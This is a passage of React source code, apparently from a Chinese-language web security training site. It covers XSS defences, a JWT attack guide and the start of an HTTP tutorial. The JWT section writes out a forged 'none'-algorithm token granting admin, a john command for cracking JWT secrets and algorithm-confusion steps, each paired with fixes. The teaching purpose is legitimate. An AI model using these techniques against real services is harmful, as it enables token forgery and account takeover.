                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        输出编码 (Output Encoding)
                      </h3>
                      <div className="text-sm text-gray-300">
                        <p className="mb-2">将用户输入转义后再插入 HTML：</p>
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// ❌ 危险
div.innerHTML = userInput;

// ✅ 安全
div.textContent = userInput;

// React 自动转义
<div>{userInput}</div>`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        Content Security Policy (CSP)
                      </h3>
                      <div className="text-sm text-gray-300">
                        <p className="mb-2">通过 HTTP Header 限制脚本来源：</p>
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  object-src 'none';`}
                        </pre>
                        <p className="text-gray-400 text-xs mt-2">禁止内联脚本和 eval()</p>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        HttpOnly Cookie
                      </h3>
                      <div className="text-sm text-gray-300">
                        <p className="mb-2">防止 JavaScript 读取 Cookie：</p>
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`Set-Cookie: session=abc123;
  HttpOnly;
  Secure;
  SameSite=Strict`}
                        </pre>
                        <p className="text-gray-400 text-xs mt-2">即使 XSS 成功,也无法窃取 Cookie</p>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        白名单验证
                      </h3>
                      <div className="text-sm text-gray-300">
                        <p className="mb-2">只允许安全字符,拒绝其他：</p>
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// 用户名只允许字母数字下划线
if (!/^[a-zA-Z0-9_]+$/.test(username)) {
  return "Invalid input";
}`}
                        </pre>
                        <p className="text-gray-400 text-xs mt-2">黑名单永远不完整,白名单更安全</p>
                      </div>
                    </div>
                  </div>

                  <div className="mt-12 bg-red-900/20 border-l-4 border-red-500 p-6 rounded-r">
                    <h3 className="text-red-400 font-bold mb-3">⚠️ 真实案例警示</h3>
                    <ul className="space-y-3 text-sm text-gray-300">
                      <li>
                        <strong className="text-white">MySpace Samy 蠕虫 (2005)</strong><br/>
                        通过存储型 XSS,在 20 小时内感染 100 万用户,成为史上传播最快的蠕虫之一。
                      </li>
                      <li>
                        <strong className="text-white">Twitter 自我转发蠕虫 (2010)</strong><br/>
                        利用 DOM-based XSS,在用户鼠标悬停时自动转发攻击推文,数小时内影响数万账号。
                      </li>
                      <li>
                        <strong className="text-white">TikTok XSS 漏洞 (2020)</strong><br/>
                        研究员发现可通过视频描述注入代码,窃取任意用户的账号权限,获赏金 $3,860。
                      </li>
                    </ul>
                  </div>

                  <div className="mt-8">
                    <button onClick={() => onNavigateToLevel('case_15')} className="bg-gradient-to-r from-orange-600 to-red-600 hover:from-orange-500 hover:to-red-500 text-white px-8 py-4 rounded-lg font-bold text-lg flex items-center gap-3 transition-all transform hover:scale-105">
                      <Play size={24} />
                      开始实战：Case 15 - WAF 绕过挑战
                      <ChevronRight size={24} />
                    </button>
                  </div>
              </div>
          );

      case 'jwt':
         return (
            <div key="jwt" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
                  <h1 className="text-4xl font-bold text-white mb-4 flex items-center gap-3">
                    <Zap className="text-purple-400" size={36}/>
                    JWT 令牌攻击完全指南
                  </h1>

                  <div className="bg-gradient-to-r from-purple-900/30 to-blue-900/30 border border-purple-500/30 p-6 rounded-lg">
                    <p className="text-lg text-gray-200 leading-relaxed">
                      <strong className="text-purple-400">JSON Web Token (JWT)</strong> 是现代 Web 应用最流行的无状态认证方式。它将用户信息编码在令牌中,服务器无需存储 Session。但如果实现不当,JWT 存在多种严重的安全漏洞。
                    </p>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-purple-500 pb-3">🔐 JWT 结构详解</h2>

                  <div className="bg-[#0d1117] p-6 rounded-lg border border-gray-700">
                    <p className="text-gray-300 mb-4">
                      一个完整的 JWT 由三部分组成,用 <code className="bg-gray-800 px-2 py-1 rounded text-yellow-400">.</code> 分隔：
                    </p>
                    <div className="bg-[#161b22] p-4 rounded border border-gray-800 mb-4">
                      <pre className="text-xs font-mono overflow-x-auto">
<span className="text-red-400">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span className="text-green-400">eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9</span>.<span className="text-blue-400">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
<span className="text-red-400">           ↑ Header (头部)         </span> <span className="text-green-400">        ↑ Payload (载荷)       </span> <span className="text-blue-400">       ↑ Signature (签名)      </span>
                      </pre>
                    </div>

                    <div className="space-y-6">
                      <div>
                        <h4 className="text-red-400 font-bold mb-2 text-lg">Part 1: Header (头部) - Base64 编码的 JSON</h4>
                        <div className="bg-[#161b22] p-4 rounded border border-gray-800">
                          <pre className="text-sm text-green-400 font-mono mb-2">
{`{
  "alg": "HS256",  ← 签名算法 (HMAC SHA-256)
  "typ": "JWT"     ← 令牌类型
}`}
                          </pre>
                          <div className="text-xs text-gray-400 mt-3">
                            <strong>常见算法：</strong>
                            <ul className="list-disc pl-5 mt-1 space-y-1">
                              <li><code>HS256</code> - 对称加密 (HMAC + SHA256)，服务器持有密钥</li>
                              <li><code>RS256</code> - 非对称加密 (RSA 公钥/私钥)，更安全</li>
                              <li><code>none</code> - <strong className="text-red-400">无签名算法 (高危漏洞!)</strong></li>
                            </ul>
                          </div>
                        </div>
                      </div>

                      <div>
                        <h4 className="text-green-400 font-bold mb-2 text-lg">Part 2: Payload (载荷) - Base64 编码的用户数据</h4>
                        <div className="bg-[#161b22] p-4 rounded border border-gray-800">
                          <pre className="text-sm text-yellow-400 font-mono mb-2">
{`{
  "userId": 42,
  "username": "alice",
  "role": "user",        ← ⚠️ 攻击者可能修改这个字段
  "exp": 1735689600      ← 过期时间 (Unix 时间戳)
}`}
                          </pre>
                          <div className="mt-3 bg-red-900/20 border border-red-500/30 p-3 rounded">
                            <p className="text-red-300 text-xs">
                              <strong>⚠️ 重要</strong>：Payload 仅做 Base64 编码,<strong>不加密</strong>！任何人都能解码查看内容,不要存储敏感信息 (密码、信用卡号等)
                            </p>
                          </div>
                        </div>
                      </div>

                      <div>
                        <h4 className="text-blue-400 font-bold mb-2 text-lg">Part 3: Signature (签名) - 防篡改校验</h4>
                        <div className="bg-[#161b22] p-4 rounded border border-gray-800">
                          <div className="text-sm text-gray-300 mb-2">签名生成算法（以 HS256 为例）：</div>
                          <pre className="text-xs text-blue-400 font-mono overflow-x-auto mb-2">
{`signature = HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key  ← 只有服务器知道的密钥
)`}
                          </pre>
                          <div className="text-xs text-gray-400 mt-3">
                            <strong>验证流程：</strong> 服务器收到 JWT 后,用相同算法重新计算签名,如果不匹配则拒绝请求
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-purple-500 pb-3">⚔️ JWT 常见攻击方式</h2>

                  <div className="space-y-6">
                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-red-400 mb-3">攻击 1: None 算法绕过</h3>
                      <p className="text-gray-300 mb-4">
                        某些 JWT 库接受 <code className="bg-gray-800 px-2 py-1 rounded text-red-400">"alg": "none"</code>,服务器将跳过签名验证,攻击者可以任意伪造令牌。
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">正常 JWT (HS256)：</div>
                        <pre className="text-green-400 font-mono text-xs overflow-x-auto mb-4">
{`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9.valid_signature_here`}
                        </pre>
                        <div className="text-sm text-gray-400 mb-2">攻击 Payload (修改 alg 为 none)：</div>
                        <pre className="text-red-400 font-mono text-xs overflow-x-auto mb-4">
{`// 1. 修改 Header
{"alg": "none", "typ": "JWT"}  ← 改为 none

// 2. 修改 Payload (提升权限)
{"userId": 42, "role": "admin"}  ← user → admin

// 3. 签名留空或删除
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ.`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-red-900/20 border border-red-500/30 p-3 rounded">
                        <p className="text-red-300 text-sm">
                          <strong>✗ 漏洞影响</strong>：攻击者可将自己提升为管理员,访问任意用户数据,执行特权操作
                        </p>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-orange-400 mb-3">攻击 2: 弱密钥暴力破解</h3>
                      <p className="text-gray-300 mb-4">
                        如果服务器使用简单的密钥（如 <code className="bg-gray-800 px-2 py-1 rounded">secret</code>, <code className="bg-gray-800 px-2 py-1 rounded">123456</code>），攻击者可以暴力破解密钥,然后伪造任意令牌。
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">使用工具 john/hashcat 破解：</div>
                        <pre className="text-orange-400 font-mono text-xs overflow-x-auto">
{`# 1. 保存 JWT 到文件
echo "eyJhbGci...signature" > jwt.txt

# 2. 使用字典攻击
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# 如果密钥是 "secret123"，几秒内即可破解`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-orange-900/20 border border-orange-500/30 p-3 rounded">
                        <p className="text-orange-300 text-sm">
                          <strong>⚠️ 真实案例</strong>：2018 年某电商网站使用密钥 "12345",研究员 5 分钟内破解并获取管理员权限
                        </p>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-yellow-400 mb-3">攻击 3: 算法混淆 (RS256 → HS256)</h3>
                      <p className="text-gray-300 mb-4">
                        服务器使用 RS256 (非对称加密),公钥公开。攻击者将 Header 改为 HS256,用公钥作为密钥重新签名。
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">漏洞原理：</div>
                        <pre className="text-yellow-400 font-mono text-xs overflow-x-auto">
{`// 1. 原始 JWT 使用 RS256 (非对称)
Header: {"alg": "RS256"}
服务器验证: 用私钥签名,公钥验证

// 2. 攻击者修改为 HS256 (对称)
Header: {"alg": "HS256"}  ← 修改算法
Payload: {"userId": 999, "role": "admin"}

// 3. 用公钥作为 HMAC 密钥重新签名
signature = HMACSHA256(header + "." + payload, public_key)

// 4. 如果服务器未强制校验算法类型,将接受此令牌！`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-yellow-900/20 border border-yellow-500/30 p-3 rounded">
                        <p className="text-yellow-300 text-sm">
                          <strong>🔍 CVE-2015-9235</strong>：Node.js 的 node-jsonwebtoken 库受此漏洞影响,已修复
                        </p>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-purple-400 mb-3">攻击 4: 未验证签名</h3>
                      <p className="text-gray-300 mb-4">
                        开发者图省事,只解码 Payload,忘记调用验证函数,导致任何人都能伪造令牌。
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">❌ 错误代码 (Node.js)：</div>
                        <pre className="text-red-400 font-mono text-xs overflow-x-auto mb-4">
{`const jwt = require('jsonwebtoken');

app.get('/profile', (req, res) => {
  const token = req.headers.authorization;
  const decoded = jwt.decode(token);  ← ❌ 只解码,未验证签名!

  const user = db.getUserById(decoded.userId);
  res.json(user);
});`}
                        </pre>
                        <div className="text-sm text-gray-400 mb-2">✅ 正确代码：</div>
                        <pre className="text-green-400 font-mono text-xs overflow-x-auto">
{`const jwt = require('jsonwebtoken');
const SECRET_KEY = process.env.JWT_SECRET;

app.get('/profile', (req, res) => {
  const token = req.headers.authorization;

  try {
    const decoded = jwt.verify(token, SECRET_KEY);  ← ✅ 验证签名
    const user = db.getUserById(decoded.userId);
    res.json(user);
  } catch (err) {
    res.status(401).json({ error: "Invalid token" });
  }
});`}
                        </pre>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-purple-500 pb-3">🛡️ JWT 安全最佳实践</h2>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        强制算法类型
                      </h3>
                      <div className="text-sm text-gray-300">
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// ✅ 明确指定允许的算法
jwt.verify(token, secretKey, {
  algorithms: ['HS256']  // 只接受 HS256
});

// ❌ 不要使用默认行为（接受任何算法）
jwt.verify(token, secretKey);`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        使用强密钥
                      </h3>
                      <div className="text-sm text-gray-300">
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// ✅ 至少 256 位随机密钥
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(32).toString('hex');

// ❌ 弱密钥（易被破解）
const SECRET_KEY = "myapp";
const SECRET_KEY = "secret123";`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        设置合理过期时间
                      </h3>
                      <div className="text-sm text-gray-300">
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// 短期 Access Token (15 分钟)
const accessToken = jwt.sign(
  { userId: 42 },
  SECRET_KEY,
  { expiresIn: '15m' }
);

// 长期 Refresh Token (7 天)
const refreshToken = jwt.sign(
  { userId: 42, type: 'refresh' },
  REFRESH_SECRET,
  { expiresIn: '7d' }
);`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        不在 JWT 中存敏感信息
                      </h3>
                      <div className="text-sm text-gray-300">
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// ❌ 危险 (Payload 可被解码)
{ password: "123456", ssn: "123-45-6789" }

// ✅ 安全 (只存 ID 和非敏感信息)
{ userId: 42, role: "user", exp: 1735689600 }`}
                        </pre>
                        <p className="text-gray-400 text-xs mt-2">敏感数据应存在服务器数据库,用 userId 查询</p>
                      </div>
                    </div>
                  </div>

                  <div className="mt-12 bg-blue-900/20 border-l-4 border-blue-500 p-6 rounded-r">
                    <h3 className="text-blue-400 font-bold mb-3 flex items-center gap-2">
                      <Lightbulb size={20}/>
                      在线 JWT 调试工具
                    </h3>
                    <p className="text-sm text-gray-300 mb-3">
                      可以使用 <a href="https://jwt.io" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:text-blue-300 underline">https://jwt.io</a> 在线解码和调试 JWT：
                    </p>
                    <ul className="space-y-2 text-sm text-gray-300">
                      <li>✅ 查看 Header 和 Payload 内容</li>
                      <li>✅ 验证签名是否有效</li>
                      <li>✅ 手动构造和测试 JWT</li>
                      <li>⚠️ 不要在公共工具中粘贴生产环境的真实令牌！</li>
                    </ul>
                  </div>

                  <div className="mt-8">
                    <button onClick={() => onNavigateToLevel('case_13')} className="bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 text-white px-8 py-4 rounded-lg font-bold text-lg flex items-center gap-3 transition-all transform hover:scale-105">
                      <Play size={24} />
                      开始实战：Case 13 - JWT None 算法漏洞利用
                      <ChevronRight size={24} />
                    </button>
                  </div>
              </div>
          );

      case 'http-basics':
        return (
          <div key="http-basics" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-4xl font-bold text-white mb-4">HTTP 协议从零到精通</h1>
            <p className="text-lg text-gray-300 leading-relaxed">
              HTTP (HyperText Transfer Protocol) 是互联网的基石。理解 HTTP 是学习网络抓包和安全测试的第一步。本章将从最基础的概念讲起,带你彻底掌握 HTTP 协议。
            </p>

            <div className="bg-blue-900/20 border-l-4 border-blue-500 p-4 rounded-r">
              <h4 className="text-blue-400 font-bold mb-2">💡 学习目标</h4>
              <ul className="text-sm text-gray-300 space-y-1">
                <li>✓ 理解 HTTP 请求-响应模型</li>
                <li>✓ 掌握 HTTP 方法、状态码、Headers 的含义</li>
                <li>✓ 理解 HTTPS 加密原理</li>
                <li>✓ 能独立分析任意 HTTP 请求</li>
              </ul>
            </div>

            <h2 className="text-3xl font-bold text-white mt-8 border-b-2 border-blue-500 pb-2">第一部分：HTTP 基础概念</h2>

            <h3 className="text-2xl font-bold text-white mt-6">1. 什么是 HTTP？</h3>
            <p className="text-gray-300">
              HTTP 是一种<strong>应用层协议</strong>,用于在客户端(浏览器、App)和服务器之间传输超文本(网页、API 数据)。它基于<strong>请求-响应模型</strong>:
            </p>

            <div className="bg-[#161b22] p-6 rounded border border-gray-700 mt-4">
              <pre className="text-sm text-gray-300 font-mono">
{`客户端                                    服务器
   |                                        |
   |  -------- HTTP 请求 --------->         |
   |  GET /api/users/123 HTTP/1.1           |
   |  Host: api.example.com                 |
   |                                        |
   |  <------- HTTP 响应 ---------          |
   |  HTTP/1.1 200 OK                       |
   |  {"name": "Alice", "id": 123}          |
   |                                        |`}
              </pre>
            </div>

            <h3 className="text-2xl font-bold text-white mt-8">2. HTTP 请求的五大组成部分</h3>

            <div className="space-y-6 mt-4">
              <div className="bg-[#0d1117] border-l-4 border-green-500 p-5 rounded-r">
                <h4 className="text-xl font-bold text-white mb-3">① 请求行 (Request Line)</h4>
                <div className="bg-[#161b22] p-3 rounded mb-3">
                  <code className="text-green-400 text-sm">GET /api/products?category=laptop HTTP/1.1</code>
                </div>
                <div className="text-gray-300 space-y-2 text-sm">
                  <div><strong>Method (方法):</strong> <code className="text-blue-400">GET</code> - 定义操作类型</div>
                  <div><strong>Path (路径):</strong> <code className="text-blue-400">/api/products</code> - 资源位置</div>
                  <div><strong>Query (查询参数):</strong> <code className="text-blue-400">?category=laptop</code> - 过滤条件</div>
                  <div><strong>Protocol (协议版本):</strong> <code className="text-blue-400">HTTP/1.1</code> 或 HTTP/2</div>
                </div>

                <div className="bg-yellow-900/20 border border-yellow-500/30 p-3 rounded mt-4">
                  <div className="text-yellow-300 text-sm font-bold mb-2">⚠️ 常见 HTTP 方法对比</div>
                  <table className="w-full text-xs text-gray-300">
                    <thead>
                      <tr className="border-b border-gray-700">
                        <th className="py-2 text-left">方法</th>
                        <th className="py-2 text-left">用途</th>
                        <th className="py-2 text-left">有 Body?</th>
                        <th className="py-2 text-left">幂等性</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code className="text-green-400">GET</code></td>
                        <td>获取资源</td>
                        <td>❌ 否</td>
                        <td>✅ 是</td>
                      </tr>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code className="text-blue-400">POST</code></td>
                        <td>创建资源</td>
                        <td>✅ 是</td>
                        <td>❌ 否</td>
                      </tr>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code className="text-yellow-400">PUT</code></td>
                        <td>完整更新</td>
                        <td>✅ 是</td>
                        <td>✅ 是</td>
                      </tr>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code className="text-purple-400">PATCH</code></td>
                        <td>部分更新</td>
                        <td>✅ 是</td>
                        <td>❌ 否</td>
                      </tr>
                      <tr>
                        <td className="py-2"><code className="text-red-400">DELETE</code></td>
                        <td>删除资源</td>
                        <td>❌ 否</td>
                        <td>✅ 是</td>
                      </tr>
                    </tbody>
                  </table>
                  <div className="text-gray-400 mt-2 text-xs">
                    💡 <strong>幂等性</strong>: 多次执行相同请求,结果一致。GET/PUT/DELETE 是幂等的,POST 不是。
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-blue-500 p-5 rounded-r">
                <h4 className="text-xl font-bold text-white mb-3">② 请求头 (Request Headers)</h4>
                <p className="text-gray-300 text-sm mb-3">
                  Headers 是键值对形式的元数据,用于传递认证信息、内容类型、浏览器信息等。
                </p>
                <div className="bg-[#161b22] p-3 rounded font-mono text-xs text-green-400 mb-3 overflow-x-auto">
{`Host: api.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Cookie: sessionId=abc123xyz; theme=dark
Content-Type: application/json
Referer: https://example.com/shop`}
                </div>

                <div className="bg-[#0d1117] p-4 rounded border border-gray-700">
                  <div className="font-bold text-white mb-3 text-sm">🔑 关键 Headers 详解</div>
                  <div className="space-y-3 text-sm">
                    <div>
                      <div className="text-blue-400 font-bold">Host</div>
                      <div className="text-gray-400">目标服务器域名,HTTP/1.1 必需,用于虚拟主机路由</div>
                    </div>
                    <div>
                      <div className="text-blue-400 font-bold">User-Agent</div>
                      <div className="text-gray-400">客户端信息(浏览器/操作系统/版本),服务器用于统计和兼容性处理</div>
                    </div>
                    <div>
                      <div className="text-blue-400 font-bold">Authorization</div>
                      <div className="text-gray-400">认证凭据(JWT Token, Basic Auth, API Key),用于身份验证</div>
                    </div>
                    <div>
                      <div className="text-blue-400 font-bold">Cookie</div>
                      <div className="text-gray-400">会话标识和用户偏好,格式: <code>key1=value1; key2=value2</code></div>
                    </div>
                    <div>
                      <div className="text-blue-400 font-bold">Content-Type</div>
                      <div className="text-gray-400">请求体的数据格式(application/json, multipart/form-data, text/html)</div>
                    </div>
                    <div>
                      <div className="text-blue-400 font-bold">Referer</div>
                      <div className="text-gray-400">请求来源页面 URL,用于防盗链和统计分析</div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-yellow-500 p-5 rounded-r">
                <h4 className="text-xl font-bold text-white mb-3">③ 请求体 (Request Body)</h4>
                <p className="text-gray-300 text-sm mb-3">
                  只有 POST、PUT、PATCH 等方法才有 Body,用于提交数据。Body 格式由 <code>Content-Type</code> 决定。
                </p>

                <div className="space-y-4">
                  <div>
                    <div className="text-sm text-gray-400 mb-1">格式 1: JSON (最常见)</div>
                    <div className="bg-[#161b22] p-3 rounded">
                      <div className="text-xs text-gray-500 mb-1">Content-Type: application/json</div>
                      <pre className="text-xs text-green-400 font-mono">
{`{
  "username": "alice",
  "email": "alice@example.com",
  "password": "SecureP@ssw0rd"
}`}
                      </pre>
                    </div>
                  </div>

                  <div>
                    <div className="text-sm text-gray-400 mb-1">格式 2: 表单数据 (传统表单)</div>
                    <div className="bg-[#161b22] p-3 rounded">
                      <div className="text-xs text-gray-500 mb-1">Content-Type: application/x-www-form-urlencoded</div>
                      <code className="text-xs text-green-400">username=alice&email=alice%40example.com&password=SecureP%40ssw0rd</code>
                    </div>
                  </div>

                  <div>
                    <div className="text-sm text-gray-400 mb-1">格式 3: 文件上传</div>
                    <div className="bg-[#161b22] p-3 rounded">
                      <div className="text-xs text-gray-500 mb-1">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary</div>
                      <pre className="text-xs text-green-400 font-mono overflow-x-auto">
{`------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

[binary data]
------WebKitFormBoundary--`}
                      </pre>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <h3 className="text-2xl font-bold text-white mt-10">3. HTTP 响应的三大组成部分</h3>

            <div className="space-y-6 mt-4">
              <div className="bg-[#0d1117] border-l-4 border-purple-500 p-5 rounded-r">
                <h4 className="text-xl font-bold text-white mb-3">① 状态行 (Status Line)</h4>
                <div className="bg-[#161b22] p-3 rounded mb-3">
                  <code className="text-yellow-400 text-sm">HTTP/1.1 200 OK</code>
                </div>
                <p className="text-gray-300 text-sm mb-3">
                  状态码是三位数字,表示请求的处理结果。记住以下规律:
                </p>

                <div className="space-y-4">
                  <div className="bg-[#161b22] p-4 rounded">
                    <div className="font-bold text-green-400 mb-2">2xx - 成功 ✅</div>
                    <ul className="text-sm text-gray-300 space-y-1 ml-4">
                      <li><code className="text-green-400">200 OK</code> - 请求成功,有返回数据</li>
                      <li><code className="text-green-400">201 Created</code> - 资源已创建(POST 成功)</li>
                      <li><code className="text-green-400">204 No Content</code> - 成功但无返回内容(DELETE 成功)</li>
                    </ul>
                  </div>

                  <div className="bg-[#161b22] p-4 rounded">
                    <div className="font-bold text-blue-400 mb-2">3xx - 重定向 🔄</div>
                    <ul className="text-sm text-gray-300 space-y-1 ml-4">
                      <li><code className="text-blue-400">301 Moved Permanently</code> - 永久重定向(SEO 友好)</li>
                      <li><code className="text-blue-400">302 Found</code> - 临时重定向(短网址服务)</li>
                      <li><code className="text-blue-400">304 Not Modified</code> - 资源未修改,使用缓存</li>
                    </ul>
                  </div>

                  <div className="bg-[#161b22] p-4 rounded">
                    <div className="font-bold text-yellow-400 mb-2">4xx - 客户端错误 ⚠️</div>
                    <ul className="text-sm text-gray-300 space-y-1 ml-4">
                      <li><code className="text-yellow-400">400 Bad Request</code> - 请求格式错误(参数缺失/类型错误)</li>
                      <li><code className="text-yellow-400">401 Unauthorized</code> - 未认证(需要登录)</li>
                      <li><code className="text-yellow-400">403 Forbidden</code> - 无权限(登录了但权限不足)</li>
                      <li><code className="text-yellow-400">404 Not Found</code> - 资源不存在</li>
                      <li><code className="text-yellow-400">429 Too Many Requests</code> - 请求过于频繁(限流)</li>
                    </ul>
                  </div>

                  <div className="bg-[#161b22] p-4 rounded">
                    <div className="font-bold text-red-400 mb-2">5xx - 服务器错误 ❌</div>
                    <ul className="text-sm text-gray-300 space-y-1 ml-4">
                      <li><code className="text-red-400">500 Internal Server Error</code> - 服务器内部错误(代码bug)</li>
                      <li><code className="text-red-400">502 Bad Gateway</code> - 网关错误(上游服务挂了)</li>
                      <li><code className="text-red-400">503 Service Unavailable</code> - 服务不可用(维护中)</li>
                      <li><code className="text-red-400">504 Gateway Timeout</code> - 网关超时(上游响应慢)</li>
                    </ul>
                  </div>
                </div>

                <div className="bg-blue-900/20 border border-blue-500/30 p-3 rounded mt-4">
                  <div className="text-sm text-blue-300">
                    <strong>💡 记忆技巧</strong>: 2xx成功,3xx跳转,4xx你的错,5xx我的错
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-pink-500 p-5 rounded-r">
                <h4 className="text-xl font-bold text-white mb-3">② 响应头 (Response Headers)</h4>
                <div className="bg-[#161b22] p-3 rounded font-mono text-xs text-yellow-400 mb-3 overflow-x-auto">
{`HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 1234
Set-Cookie: sessionId=xyz789; HttpOnly; Secure; SameSite=Strict
Cache-Control: no-cache, no-store, must-revalidate
Access-Control-Allow-Origin: https://app.example.com
X-RateLimit-Remaining: 99`}
                </div>

                <div className="bg-[#0d1117] p-4 rounded border border-gray-700">
                  <div className="font-bold text-white mb-3 text-sm">🔑 重要响应头解析</div>
                  <div className="space-y-3 text-sm">
                    <div>
                      <div className="text-pink-400 font-bold">Set-Cookie</div>
                      <div className="text-gray-400">设置客户端 Cookie,<code>HttpOnly</code>防止JS读取,<code>Secure</code>仅HTTPS,<code>SameSite</code>防CSRF</div>
                    </div>
                    <div>
                      <div className="text-pink-400 font-bold">Cache-Control</div>
                      <div className="text-gray-400">缓存策略,<code>no-cache</code>每次验证,<code>max-age=3600</code>缓存1小时</div>
                    </div>
                    <div>
                      <div className="text-pink-400 font-bold">Access-Control-Allow-Origin</div>
                      <div className="text-gray-400">CORS跨域配置,<code>*</code>允许所有域,或指定特定域名</div>
                    </div>
                    <div>
                      <div className="text-pink-400 font-bold">Content-Encoding</div>
                      <div className="text-gray-400">压缩算法,<code>gzip</code>或<code>br</code>(Brotli),减少传输大小</div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-orange-500 p-5 rounded-r">
                <h4 className="text-xl font-bold text-white mb-3">③ 响应体 (Response Body)</h4>
                <p className="text-gray-300 text-sm mb-3">
                  响应体包含实际的业务数据,格式由 <code>Content-Type</code> 决定。
                </p>

                <div className="space-y-4">
                  <div>
                    <div className="text-sm text-gray-400 mb-1">成功响应示例</div>
                    <div className="bg-[#161b22] p-3 rounded">
                      <pre className="text-xs text-yellow-400 font-mono">
{`{
  "success": true,
  "data": {
    "userId": 42,
    "username": "alice",
    "role": "admin"
  },
  "message": "Login successful"
}`}
                      </pre>
                    </div>
                  </div>

                  <div>
